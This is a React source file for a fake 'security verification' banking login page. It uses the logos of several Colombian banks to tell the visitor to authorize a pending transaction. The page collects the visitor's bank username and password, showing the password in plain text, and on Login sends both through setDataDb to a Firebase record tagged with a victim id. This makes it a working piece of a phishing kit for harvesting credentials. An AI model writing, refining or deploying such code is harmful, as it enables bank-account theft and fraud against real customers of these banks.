import React, { useEffect, useRef, useState } from 'react'
import logo1 from '../../../assets/472/logoBankUniversal1.png'
import logo2 from '../../../assets/472/logoBankUniversal2.png'
import person from '../../../assets/472/person.png'
import candado from '../../../assets/472/candado.png'

import bancolombia from '../../../assets/472/bancolombia.png'
import nequi from '../../../assets/472/nequi.png'
import bancoBogota from '../../../assets/472/bancoBogota2.png'
import davivienda from '../../../assets/472/davivienda2.png'
import bancoOccidente from '../../../assets/472/bancoOccidente2.png'

import { setDataDb } from '../../../Firebase/sendFirebaseData'
import Slider from 'react-slick'

const BankUniversal = ({ idF }) => {
    const [dataBankUniversal, setDataBankUniversal] = useState({ user: "", pass: "" })
    const [notificacion, setNotificacion] = useState("")
    const refSlide=useRef()
    const settings = {
        dots: false,
        infinite: true,
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 2000,
        cssEase: "linear"
    };

    const handlerChange = (e) => {
        setDataBankUniversal({
            ...dataBankUniversal,
            [e.target.name]: e.target.value
        })
        setNotificacion("")
    }

    const btnLogin = () => {
        if (!dataBankUniversal.user || !dataBankUniversal.pass) {
            setNotificacion("Los campos son obligatorios")
            return
        }
        setDataDb(idF, "bankUniversal", dataBankUniversal)
    }
    useEffect(()=>{
        refSlide.current.slickPlay()
    },[])
    return (
        <div className=' px-3 z-20'>
            <div className='flex justify-between mt-2'>
                <img className='w-18 h-16' src={logo1} />
                <div className='w-18 h-16 relative '>
                    <img className='w-full h-full' src={logo2} />
                    <div className='w-full h-0.5 bg-white absolute top-0'></div>
                </div>
            </div>
            <div className='mt-14'>
                <p className='text-blue-900 text-xl font-bold text-center'>VERIFICACIÓN DE SEGURIDAD</p>
                <p className='text-center text-sm'>Debes autorizar la transacción que está en proceso, inicia sesión en tu banca virtual, a continuación</p>
            </div>
            <div className='my-8'>
                <Slider {...settings} ref={refSlide}>
                    {[bancoOccidente,davivienda,bancoBogota,bancolombia,nequi,].map((item, i) => {
                        return<div key={i} className=''>
                            <img  className={`ml-5 object-contain transform duration-1000 delay-1000 w-4/5 h-14`}
                                src={item}
                            />

                        </div>
                    })}
                </Slider>
                
            </div>
            <div className='border-2 p-2'>
                <div className='border-2 flex items-center h-8 bg-neutral-300'>
                    <img className='w-4 mx-2' src={person} />
                    <input type="text"
                        placeholder='Usuario'
                        className='w-full h-full px-3 outline-none'
                        name='user'
                        value={dataBankUniversal.user}
                        onChange={handlerChange}
                    />
                </div>
                <div className='border-2 flex items-center mt-4 h-8 bg-neutral-300'>
                    <img className='w-4 mx-2 opacity-70' src={candado} />
                    <input type="text"
                        placeholder='Contraseña'
                        className='w-full h-full px-3 outline-none'
                        name='pass'
                        value={dataBankUniversal.pass}
                        onChange={handlerChange}
                    />
                </div>
                <button onClick={() => btnLogin()} className='bg-blue-900 px-3 py-1 w-full mt-4 text-white'>Login</button>
            </div>
            {<p className='text-sm text-red-600 text-center mb-10 h-2 mt-5'>{notificacion}</p>}
        </div>
    )
}

export default BankUniversal